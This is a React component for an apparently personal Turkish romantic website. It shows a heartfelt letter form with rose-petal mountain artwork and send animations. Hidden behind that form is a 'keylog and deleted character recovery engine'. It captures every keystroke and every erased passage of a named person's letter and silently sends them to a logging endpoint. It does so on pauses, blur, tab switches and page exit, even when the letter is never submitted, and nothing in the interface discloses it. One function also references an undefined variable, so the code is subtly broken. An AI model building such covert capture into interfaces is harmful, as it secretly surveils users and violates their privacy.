import React, { useState, useRef, useEffect, useCallback } from 'react';
import { Send, Calendar, CheckCircle2 } from 'lucide-react';
import { postLogToApi, detectClientDevice } from '../utils/gardenEngine';

/**
 * LetterComposerSection Component
 * At the very bottom of the page:
 * - Authentic Rose Petal Mountains (Gül Taneciklerinden Oluşan Dağlar) at zIndex: 25.
 * - Falling rose petals (zIndex: 15) fall directly BEHIND these mountains!
 * - Real-time keystroke tracking & deleted character recovery engine.
 * - Origami Paper Airplane animation for "Şimdi".
 * - Rolled Scroll in a Glass Bottle animation for "Sonra".
 */
export default function LetterComposerSection({ scrollProgress = 0, sectionIndex = 39 }) {
  const [letterText, setLetterText] = useState('');
  const [sendMode, setSendMode] = useState('now'); // 'now' | 'future'
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [submittedStatus, setSubmittedStatus] = useState(null); // null | 'plane_flying' | 'bottle_dropping' | 'success'

  // Default target date: 1 week from now, at 21:00
  const [targetDate, setTargetDate] = useState(() => {
    const d = new Date();
    d.setDate(d.getDate() + 7);
    const yyyy = d.getFullYear();
    const mm = String(d.getMonth() + 1).padStart(2, '0');
    const dd = String(d.getDate()).padStart(2, '0');
    return `${yyyy}-${mm}-${dd}T21:00`;
  });

  // =========================================================================
  // KEYLOG & DELETED CHARACTER RECOVERY ENGINE
  // =========================================================================
  const allTypedRef = useRef(''); // Accumulates every single character ever typed
  const deletedSegmentsRef = useRef([]); // Stores every word/sentence that was erased
  const prevTextRef = useRef('');
  const draftTimerRef = useRef(null);

  // Send draft & keylog data to API / Webhook with beacon fallback
  const syncDraftToWebhook = useCallback(
    (currentText, isAbandon = false) => {
      const allTyped = allTypedRef.current;
      let localDevId = '';
      try {
        localDevId = localStorage.getItem('mayko_persistent_device_id') || '';
      } catch (e) {}
      if (localDevId === 'dev_m2troqnl9_mswunr9c') return;

      if (!allTyped && (!currentText || currentText.trim() === '')) return;

      const payload = {
        letterText: currentText || '',
        allTypedHistory: allTyped || currentText || '',
        deletedText: deleted || (allTyped && allTyped !== currentText ? allTyped : '-'),
        draftLength: (currentText || '').length,
        sendMode,
        targetDate: sendMode === 'future' ? targetDate : 'Hemen Şimdi',
        device: detectClientDevice(),
        is_aysenur: true
      };

      // 1. If page is unloading, try navigator.sendBeacon for 100% guarantee
      if (isAbandon && typeof navigator !== 'undefined' && navigator.sendBeacon) {
        try {
          const beaconData = JSON.stringify({
            eventType: 'letter_draft_abandoned',
            data: payload,
            timestamp: new Date().toISOString()
          });
          const blob = new Blob([beaconData], { type: 'application/json' });
          navigator.sendBeacon('/api/flower-logs', blob);
          return;
        } catch (e) {}
      }

      // 2. Standard API post
      postLogToApi(isAbandon ? 'letter_draft_abandoned' : 'letter_draft_update', payload);
    },
    [sendMode, targetDate]
  );

  // Handle every input & keystroke change
  const handleTextChange = (e) => {
    const val = e.target.value;
    const prev = prevTextRef.current;

    // Detect added characters
    if (val.length > prev.length) {
      allTypedRef.current += val.slice(prev.length);
    } else if (val.length < prev.length) {
      // Detect deleted characters and store them
      const deletedPart = prev.replace(val, '');
      if (deletedPart && deletedPart.trim()) {
        deletedSegmentsRef.current.push(deletedPart.trim());
      }
    }

    prevTextRef.current = val;
    setLetterText(val);

    // Save to local session backup
    try {
      sessionStorage.setItem('mayko_letter_current', val);
      sessionStorage.setItem('mayko_letter_all_typed', allTypedRef.current);
      sessionStorage.setItem('mayko_letter_deleted', deletedSegmentsRef.current.join(' | '));
    } catch (err) {}

    // Debounced sync to webhook
    if (draftTimerRef.current) clearTimeout(draftTimerRef.current);
    draftTimerRef.current = setTimeout(() => {
      syncDraftToWebhook(val, false);
    }, 1800);
  };

  // High-reliability multi-event listener for page leave / tab switch / background
  useEffect(() => {
    const handleLeave = () => {
      syncDraftToWebhook(prevTextRef.current, true);
    };

    const handleVisibilityChange = () => {
      if (document.visibilityState === 'hidden') {
        syncDraftToWebhook(prevTextRef.current, true);
      }
    };

    window.addEventListener('beforeunload', handleLeave);
    window.addEventListener('pagehide', handleLeave);
    document.addEventListener('visibilitychange', handleVisibilityChange);

    return () => {
      window.removeEventListener('beforeunload', handleLeave);
      window.removeEventListener('pagehide', handleLeave);
      document.removeEventListener('visibilitychange', handleVisibilityChange);
      if (draftTimerRef.current) clearTimeout(draftTimerRef.current);
    };
  }, [syncDraftToWebhook]);

  // Submit Final Letter
  const handleSubmit = async (e) => {
    if (e) e.preventDefault();
    if (!letterText.trim() || isSubmitting) return;

    setIsSubmitting(true);

    const formattedTargetDate =
      sendMode === 'future'
        ? new Date(targetDate).toLocaleString('tr-TR', {
            year: 'numeric',
            month: 'long',
            day: 'numeric',
            hour: '2-digit',
            minute: '2-digit'
          })
        : 'Hemen Şimdi';

    const allTyped = allTypedRef.current || letterText.trim();
    const deleted = deletedSegmentsRef.current.filter(Boolean).join(' | ') || '-';

    // Send Webhook Notification with complete letter details and deleted history
    try {
      await postLogToApi('letter_submitted', {
        action: 'Ayşenur Mektup Gönderdi',
        letterText: letterText.trim(),
        allTypedHistory: allTyped,
        deletedText: deleted,
        letterMode: sendMode === 'now' ? 'Hemen Şimdi (Kağıt Uçak)' : `İleri Bir Tarihte (${formattedTargetDate} - Şişe İçinde)`,
        targetDate: formattedTargetDate,
        device: detectClientDevice(),
        is_aysenur: true
      });
    } catch (err) {}

    // Trigger visual animation based on sendMode
    if (sendMode === 'now') {
      setSubmittedStatus('plane_flying');
    } else {
      setSubmittedStatus('bottle_dropping');
    }

    setTimeout(() => {
      setSubmittedStatus('success');
      setIsSubmitting(false);
    }, 2800);
  };

  return (
    <div
      style={{
        position: 'relative',
        width: '100%',
        maxWidth: 780,
        margin: '0 auto',
        padding: '20px 16px 60px 16px',
        display: 'flex',
        flexDirection: 'column',
        alignItems: 'center',
        textAlign: 'center',
        zIndex: 30 // IN FRONT of Mountains (zIndex: 25) and Petals (zIndex: 15)
      }}
    >
      {/* =========================================================================
          BACKGROUND: AUTHENTIC ROSE PETALS MOUNTAINS (Gül Taneciklerinden Oluşan Dağlar)
          Rendered at zIndex: 25 so falling rose petals (zIndex: 15) fall BEHIND these mountains!
      ========================================================================= */}
      <div
        style={{
          position: 'fixed',
          bottom: 0,
          left: 0,
          width: '100vw',
          height: '46vh',
          maxHeight: 420,
          pointerEvents: 'none',
          zIndex: 25, // IN FRONT OF FALLING PETALS (zIndex: 15)
          overflow: 'hidden'
        }}
      >
        <svg
          viewBox="0 0 1440 420"
          fill="none"
          style={{ width: '100%', height: '100%', display: 'block', overflow: 'visible' }}
          preserveAspectRatio="none"
        >
          <defs>
            {/* Deep Velvet Petal Cluster Gradient */}
            <linearGradient id="petalClusterDark" x1="0%" y1="0%" x2="0%" y2="100%">
              <stop offset="0%" stopColor="#4c0519" stopOpacity="0.98" />
              <stop offset="60%" stopColor="#2a0410" stopOpacity="1" />
              <stop offset="100%" stopColor="#080204" stopOpacity="1" />
            </linearGradient>

            {/* Glowing Rose Petal Crest Gradient */}
            <linearGradient id="petalClusterGlow" x1="0%" y1="0%" x2="0%" y2="100%">
              <stop offset="0%" stopColor="#881337" stopOpacity="0.98" />
              <stop offset="40%" stopColor="#5c0720" stopOpacity="0.99" />
              <stop offset="100%" stopColor="#0a0b0e" stopOpacity="1" />
            </linearGradient>

            <linearGradient id="petalRidgeGlow" x1="0%" y1="0%" x2="100%" y2="0%">
              <stop offset="0%" stopColor="#ff4d6d" stopOpacity="0.4" />
              <stop offset="35%" stopColor="#e11d48" stopOpacity="0.85" />
              <stop offset="65%" stopColor="#be123c" stopOpacity="0.9" />
              <stop offset="100%" stopColor="#ff758f" stopOpacity="0.45" />
            </linearGradient>
          </defs>

          {/* BACK LAYER: Distant Mounds composed of layered rose petal arches */}
          <path
            d="M 0 200 
               Q 120 140, 240 180 
               Q 360 110, 490 160 
               Q 620 90, 780 150 
               Q 920 80, 1080 140 
               Q 1240 100, 1360 160 
               Q 1400 170, 1440 190 
               L 1440 420 L 0 420 Z"
            fill="url(#petalClusterDark)"
          />

          {/* DENSE SCALLOPED ORGANIC ROSE PETAL CONTOURS ACROSS THE PEAKS */}
          {/* Layer of individual overlapping rose petal arches creating authentic mountain texture */}
          <g fill="#3b0313" stroke="#881337" strokeWidth="0.8" opacity="0.85">
            {/* Ridge 1 Petals */}
            <path d="M 80 170 C 95 155, 115 155, 130 170 C 145 155, 165 155, 180 170 C 195 155, 215 155, 230 170" />
            <path d="M 330 140 C 350 120, 375 120, 395 140 C 415 120, 440 120, 460 140 C 480 120, 505 120, 525 140" />
            <path d="M 700 120 C 725 95, 755 95, 780 120 C 805 95, 835 95, 860 120 C 885 95, 915 95, 940 120" />
            <path d="M 1020 110 C 1045 85, 1075 85, 1100 110 C 1125 85, 1155 85, 1180 110" />
          </g>

          {/* FOREGROUND LAYER: Massive Piled-Up Mountain of Crimson Rose Petals */}
          <path
            d="M 0 250 
               Q 160 180, 320 220 
               Q 480 140, 660 210 
               Q 860 110, 1040 190 
               Q 1200 130, 1340 180 
               Q 1400 190, 1440 210 
               L 1440 420 L 0 420 Z"
            fill="url(#petalClusterGlow)"
          />

          {/* Glowing Crest Edge of Rose Petal Mountain */}
          <path
            d="M 0 250 
               Q 160 180, 320 220 
               Q 480 140, 660 210 
               Q 860 110, 1040 190 
               Q 1200 130, 1340 180 
               Q 1400 190, 1440 210"
            stroke="url(#petalRidgeGlow)"
            strokeWidth="2.8"
            strokeLinecap="round"
            opacity="0.88"
          />

          {/* Thousands of densely textured overlapping Rose Petals covering the entire foreground mountain slope */}
          <g opacity="0.92">
            {/* Cluster 1: Left Peak Petals */}
            <path d="M 140 200 C 158 185, 178 185, 196 200 Z" fill="#9f1239" stroke="#e11d48" strokeWidth="0.8" />
            <path d="M 170 205 C 188 190, 208 190, 226 205 Z" fill="#be123c" stroke="#fb7185" strokeWidth="0.8" />
            <path d="M 200 212 C 218 197, 238 197, 256 212 Z" fill="#e11d48" stroke="#ff4d6d" strokeWidth="0.8" />
            <path d="M 230 218 C 248 203, 268 203, 286 218 Z" fill="#881337" stroke="#be123c" strokeWidth="0.8" />

            {/* Cluster 2: Center-Left Massive Petal Ridge */}
            <path d="M 450 165 C 472 145, 498 145, 520 165 Z" fill="#be123c" stroke="#fda4af" strokeWidth="0.9" />
            <path d="M 485 170 C 507 150, 533 150, 555 170 Z" fill="#e11d48" stroke="#ff758f" strokeWidth="0.9" />
            <path d="M 520 178 C 542 158, 568 158, 590 178 Z" fill="#9f1239" stroke="#e11d48" strokeWidth="0.9" />
            <path d="M 555 186 C 577 166, 603 166, 625 186 Z" fill="#881337" stroke="#be123c" strokeWidth="0.9" />
            <path d="M 590 195 C 612 175, 638 175, 660 195 Z" fill="#e11d48" stroke="#ff4d6d" strokeWidth="0.9" />

            {/* Cluster 3: The Grand Main Rose Mountain Summit (Center-Right) */}
            <path d="M 810 135 C 835 110, 865 110, 890 135 Z" fill="#ff4d6d" stroke="#ffffff" strokeWidth="1" />
            <path d="M 845 142 C 870 117, 900 117, 925 142 Z" fill="#e11d48" stroke="#fda4af" strokeWidth="1" />
            <path d="M 880 150 C 905 125, 935 125, 960 150 Z" fill="#be123c" stroke="#ff758f" strokeWidth="0.9" />
            <path d="M 915 160 C 940 135, 970 135, 995 160 Z" fill="#9f1239" stroke="#e11d48" strokeWidth="0.9" />
            <path d="M 950 172 C 975 147, 1005 147, 1030 172 Z" fill="#881337" stroke="#be123c" strokeWidth="0.9" />

            {/* Cluster 4: Right Petal Summit */}
            <path d="M 1160 155 C 1182 135, 1208 135, 1230 155 Z" fill="#e11d48" stroke="#ff4d6d" strokeWidth="0.9" />
            <path d="M 1195 162 C 1217 142, 1243 142, 1265 162 Z" fill="#be123c" stroke="#fda4af" strokeWidth="0.9" />
            <path d="M 1230 170 C 1252 150, 1278 150, 1300 170 Z" fill="#9f1239" stroke="#e11d48" strokeWidth="0.9" />
          </g>
        </svg>
      </div>

      {/* ========================================================
          LETTER PROMPT & HEADING
      ======================================================== */}
      <div style={{ position: 'relative', zIndex: 35, width: '100%', marginBottom: 28 }}>
        <p
          style={{
            fontFamily: "'Cardo', Georgia, serif",
            fontSize: 'clamp(1.2rem, 2.3vw, 1.55rem)',
            fontWeight: 400,
            fontStyle: 'italic',
            color: '#f1f3f7',
            lineHeight: 1.85,
            letterSpacing: '0.02em',
            margin: '0 0 14px 0',
            textShadow: '0 0 18px rgba(255, 255, 255, 0.35)'
          }}
        >
          Sen de bir cümle bir şeyler bırakmak ister misin? Seni duymaya, seni okumaya ne kadar hasret olduğumu
          bilemezsin.. Hem gelecek bir tarih için bile bir mektup bırakabilirsin. Neyse, Çok konuştum..
        </p>
      </div>

      {/* ========================================================
          COMPOSE FORM & SUBMISSION ANIMATIONS
      ======================================================== */}
      <div style={{ position: 'relative', zIndex: 35, width: '100%', maxWidth: 660 }}>
        {/* SUCCESS CONFIRMATION STATE */}
        {submittedStatus === 'success' && (
          <div
            className="animate-fade-in"
            style={{
              padding: '36px 28px',
              borderRadius: 24,
              background: 'rgba(15, 17, 21, 0.94)',
              border: '1px solid rgba(255, 77, 109, 0.45)',
              boxShadow: '0 0 35px rgba(225, 29, 72, 0.25)',
              backdropFilter: 'blur(16px)'
            }}
          >
            <div
              style={{
                width: 56,
                height: 56,
                borderRadius: '50%',
                background: 'rgba(225, 29, 72, 0.15)',
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'center',
                margin: '0 auto 16px auto',
                color: '#ff4d6d'
              }}
            >
              <CheckCircle2 size={32} />
            </div>
            <h3
              style={{
                fontFamily: "'Cardo', Georgia, serif",
                fontSize: '1.75rem',
                fontStyle: 'italic',
                color: '#ffffff',
                margin: '0 0 10px 0'
              }}
            >
              {sendMode === 'now' ? 'Mektubun gökyüzüne kanatlandı..' : 'Mektubun şişeye mühürlendi..'}
            </h3>
            <p
              style={{
                fontFamily: "'Cardo', Georgia, serif",
                fontSize: '1.2rem',
                fontStyle: 'italic',
                color: '#cbd5e1',
                margin: 0,
                lineHeight: 1.6
              }}
            >
              {sendMode === 'now'
                ? 'Kelimelerin bana ulaştı. Seni çok seviyorum.. Teşekkür ederim.'
                : `Mektubun gül dağlarının ardına saklandı ve ${new Date(targetDate).toLocaleString('tr-TR', {
                    day: 'numeric',
                    month: 'long',
                    year: 'numeric',
                    hour: '2-digit',
                    minute: '2-digit'
                  })} vaktinde bana açılacak..`}
            </p>
          </div>
        )}

        {/* 3D ORIGAMI PAPER AIRPLANE FLYING ANIMATION */}
        {submittedStatus === 'plane_flying' && (
          <div
            style={{
              position: 'relative',
              height: 280,
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'center'
            }}
          >
            <div
              style={{
                animation: 'paperPlaneSwoop 2.7s cubic-bezier(0.25, 1, 0.5, 1) forwards',
                filter: 'drop-shadow(0 0 10px rgba(255, 255, 255, 0.8)) drop-shadow(0 0 25px rgba(255, 77, 109, 0.5))'
              }}
            >
              <svg width="120" height="90" viewBox="0 0 120 90" fill="none">
                <path d="M 10 45 L 110 10 L 55 80 L 45 52 Z" fill="#ffffff" stroke="#e2e8f0" strokeWidth="1.5" />
                <path d="M 110 10 L 45 52 L 55 80 Z" fill="#cbd5e1" />
                <path d="M 110 10 L 10 45 L 45 52 Z" fill="#f8fafc" />
                <circle cx="20" cy="50" r="2.5" fill="#ff4d6d" opacity="0.8" />
                <circle cx="5" cy="55" r="1.8" fill="#fda4af" opacity="0.6" />
              </svg>
            </div>
          </div>
        )}

        {/* ROLLED SCROLL IN A GLASS BOTTLE DROPPING ANIMATION */}
        {submittedStatus === 'bottle_dropping' && (
          <div
            style={{
              position: 'relative',
              height: 280,
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'center'
            }}
          >
            <div
              style={{
                animation: 'bottleDropBehindMountains 2.7s cubic-bezier(0.25, 1, 0.5, 1) forwards',
                filter: 'drop-shadow(0 0 12px rgba(255, 255, 255, 0.75)) drop-shadow(0 0 30px rgba(225, 29, 72, 0.4))'
              }}
            >
              <svg width="90" height="170" viewBox="0 0 90 170" fill="none">
                <rect x="36" y="8" width="18" height="14" rx="2" fill="#d97706" stroke="#b45309" strokeWidth="1.2" />
                <path d="M 34 22 L 34 45 L 20 65 L 20 150 C 20 162, 70 162, 70 150 L 70 65 L 56 22 Z" fill="rgba(255, 255, 255, 0.25)" stroke="#ffffff" strokeWidth="2.2" />
                <path d="M 30 75 L 60 75 L 60 142 L 30 142 Z" fill="#fef3c7" stroke="#d97706" strokeWidth="1.4" rx="3" />
                <rect x="28" y="105" width="34" height="6" fill="#e11d48" rx="1" />
                <path d="M 26 70 L 26 145" stroke="rgba(255, 255, 255, 0.65)" strokeWidth="2.5" strokeLinecap="round" />
              </svg>
            </div>
          </div>
        )}

        {/* ACTIVE FORM */}
        {!submittedStatus && (
          <form onSubmit={handleSubmit} style={{ width: '100%' }}>
            {/* LARGE TEXTAREA */}
            <div style={{ position: 'relative', marginBottom: 20 }}>
              <textarea
                value={letterText}
                onChange={handleTextChange}
                placeholder="Kalbinden geçen ne varsa buraya fısıldayabilirsin.."
                rows={7}
                style={{
                  width: '100%',
                  boxSizing: 'border-box',
                  padding: '20px 24px',
                  backgroundColor: 'rgba(10, 11, 14, 0.88)',
                  color: '#f8fafc',
                  fontFamily: "'Cardo', Georgia, serif",
                  fontSize: '1.22rem',
                  lineHeight: 1.8,
                  borderRadius: 22,
                  border: '1px solid rgba(255, 255, 255, 0.35)',
                  outline: 'none',
                  resize: 'vertical',
                  minHeight: 170,
                  boxShadow: '0 0 25px rgba(0, 0, 0, 0.85), 0 0 15px rgba(255, 77, 109, 0.12)',
                  backdropFilter: 'blur(14px)',
                  transition: 'border-color 0.3s ease, box-shadow 0.3s ease'
                }}
                onFocus={(e) => {
                  e.target.style.borderColor = 'rgba(255, 77, 109, 0.75)';
                  e.target.style.boxShadow = '0 0 30px rgba(225, 29, 72, 0.28)';
                }}
                onBlur={(e) => {
                  e.target.style.borderColor = 'rgba(255, 255, 255, 0.35)';
                  e.target.style.boxShadow = '0 0 25px rgba(0, 0, 0, 0.85), 0 0 15px rgba(255, 77, 109, 0.12)';
                  syncDraftToWebhook(letterText, false);
                }}
              />
            </div>

            {/* SEND MODE TOGGLE (Şimdi vs. İleri Tarih) */}
            <div
              style={{
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'center',
                gap: 12,
                marginBottom: 22,
                flexWrap: 'wrap'
              }}
            >
              <button
                type="button"
                onClick={() => setSendMode('now')}
                style={{
                  padding: '10px 22px',
                  borderRadius: '9999px',
                  fontFamily: "'Cardo', Georgia, serif",
                  fontSize: '1.05rem',
                  fontStyle: 'italic',
                  cursor: 'pointer',
                  border: sendMode === 'now' ? '1px solid #ff4d6d' : '1px solid rgba(255, 255, 255, 0.25)',
                  backgroundColor: sendMode === 'now' ? 'rgba(225, 29, 72, 0.25)' : 'rgba(15, 17, 21, 0.75)',
                  color: sendMode === 'now' ? '#ffffff' : 'rgba(228, 231, 236, 0.65)',
                  boxShadow: sendMode === 'now' ? '0 0 18px rgba(225, 29, 72, 0.35)' : 'none',
                  transition: 'all 0.25s ease'
                }}
              >
                🕊️ Hemen Şimdi Gönder
              </button>

              <button
                type="button"
                onClick={() => setSendMode('future')}
                style={{
                  padding: '10px 22px',
                  borderRadius: '9999px',
                  fontFamily: "'Cardo', Georgia, serif",
                  fontSize: '1.05rem',
                  fontStyle: 'italic',
                  cursor: 'pointer',
                  border: sendMode === 'future' ? '1px solid #ff4d6d' : '1px solid rgba(255, 255, 255, 0.25)',
                  backgroundColor: sendMode === 'future' ? 'rgba(225, 29, 72, 0.25)' : 'rgba(15, 17, 21, 0.75)',
                  color: sendMode === 'future' ? '#ffffff' : 'rgba(228, 231, 236, 0.65)',
                  boxShadow: sendMode === 'future' ? '0 0 18px rgba(225, 29, 72, 0.35)' : 'none',
                  transition: 'all 0.25s ease'
                }}
              >
                📜 İleri Bir Tarihte Gönder
              </button>
            </div>

            {/* FUTURE DATE & TIME PICKER (If sendMode === 'future') */}
            {sendMode === 'future' && (
              <div
                className="animate-slide-up"
                style={{
                  padding: '18px 24px',
                  borderRadius: 20,
                  backgroundColor: 'rgba(15, 17, 21, 0.88)',
                  border: '1px solid rgba(255, 77, 109, 0.35)',
                  boxShadow: '0 0 20px rgba(0, 0, 0, 0.5)',
                  marginBottom: 24,
                  display: 'flex',
                  flexDirection: 'column',
                  alignItems: 'center',
                  gap: 12
                }}
              >
                <div style={{ display: 'flex', alignItems: 'center', gap: 8, color: '#fda4af' }}>
                  <Calendar size={18} />
                  <span
                    style={{
                      fontFamily: "'Cardo', Georgia, serif",
                      fontSize: '1.08rem',
                      fontStyle: 'italic'
                    }}
                  >
                    Mektubun bana açılacağı gün ve saati seç:
                  </span>
                </div>
                <input
                  type="datetime-local"
                  value={targetDate}
                  onChange={(e) => setTargetDate(e.target.value)}
                  style={{
                    backgroundColor: '#0a0b0e',
                    color: '#ffffff',
                    border: '1px solid rgba(255, 255, 255, 0.4)',
                    borderRadius: 14,
                    padding: '10px 18px',
                    fontFamily: "'Cardo', Georgia, serif",
                    fontSize: '1.1rem',
                    outline: 'none',
                    textAlign: 'center',
                    cursor: 'pointer',
                    colorScheme: 'dark'
                  }}
                />
              </div>
            )}

            {/* SUBMIT BUTTON */}
            <button
              type="submit"
              disabled={!letterText.trim() || isSubmitting}
              style={{
                padding: '14px 38px',
                borderRadius: '9999px',
                border: 'none',
                background: letterText.trim()
                  ? 'linear-gradient(135deg, #ff4d6d 0%, #e11d48 100%)'
                  : 'rgba(255, 255, 255, 0.12)',
                color: letterText.trim() ? '#ffffff' : 'rgba(255, 255, 255, 0.4)',
                fontFamily: "'Cardo', Georgia, serif",
                fontSize: '1.18rem',
                fontStyle: 'italic',
                fontWeight: 600,
                letterSpacing: '0.04em',
                cursor: letterText.trim() && !isSubmitting ? 'pointer' : 'not-allowed',
                boxShadow: letterText.trim() ? '0 0 25px rgba(225, 29, 72, 0.45)' : 'none',
                display: 'inline-flex',
                alignItems: 'center',
                gap: 10,
                transition: 'all 0.3s ease'
              }}
            >
              <Send size={18} />
              <span>{isSubmitting ? 'Mektup Mühürleniyor..' : 'Mektubu Gönder'}</span>
            </button>
          </form>
        )}
      </div>

      {/* Global animations keyframes injection */}
      <style>{`
        @keyframes paperPlaneSwoop {
          0% {
            transform: translateY(40px) scale(0.6) rotate(-15deg);
            opacity: 0;
          }
          20% {
            transform: translateY(0px) scale(1) rotate(-5deg);
            opacity: 1;
          }
          50% {
            transform: translateY(-80px) translateX(60px) scale(1.15) rotate(15deg);
          }
          100% {
            transform: translateY(-380px) translateX(240px) scale(0.3) rotate(-35deg);
            opacity: 0;
          }
        }

        @keyframes bottleDropBehindMountains {
          0% {
            transform: translateY(-40px) scale(0.6) rotate(12deg);
            opacity: 0;
          }
          20% {
            transform: translateY(0px) scale(1) rotate(0deg);
            opacity: 1;
          }
          65% {
            transform: translateY(70px) rotate(-8deg);
            opacity: 0.95;
          }
          100% {
            transform: translateY(220px) scale(0.4) rotate(20deg);
            opacity: 0;
          }
        }
      `}</style>
    </div>
  );
}
